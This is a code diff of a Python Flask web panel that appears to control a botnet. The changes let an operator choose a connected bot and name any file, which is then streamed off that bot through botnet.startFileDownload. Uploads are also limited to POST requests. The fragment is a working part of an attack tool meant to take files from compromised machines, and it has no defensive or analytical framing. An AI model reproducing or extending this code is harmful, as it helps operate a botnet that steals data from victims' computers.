@@ -50,7 +50,7 @@ def authenticate():
         {'WWW-Authenticate': 'Basic realm="Login Required"'})
 
 
-@app.route('/uploader', methods=['GET', 'POST'])
+@app.route('/uploader', methods=['POST'])
 def upload_file():
     if request.method == 'POST':
         f = request.files['file']
@@ -59,11 +59,15 @@ def upload_file():
         # TODO switch to in-progress instead of "success"
         return json.dumps({"success": True})
 
-@app.route('/downloader', methods=['GET'])
+@app.route('/downloader', methods=['POST'])
 def download_file():
-    filename = "example.txt"
-    # Steam the file from the client (don't save locally)
-    return Response(stream_with_context(botnet.startFileDownload(connected,filename)))
+    if request.method == 'POST':
+        filename = request.form.get('file')
+        response= Response(stream_with_context(botnet.startFileDownload(connected,filename)))
+        # Set the right header for the response
+        # to be downloaded, instead of just printed on the browser
+        # response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
+        return response
 
 def requires_auth(f):
     @wraps(f)
@@ -80,8 +84,7 @@ def requires_auth(f):
 def index():
     global connected
     if request.method == 'POST':
-        select = request.form.get('bot')
-        connected = str(select)
+        connected = request.form.get('bot')
     return render_template('index.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                            connected=connected)
 
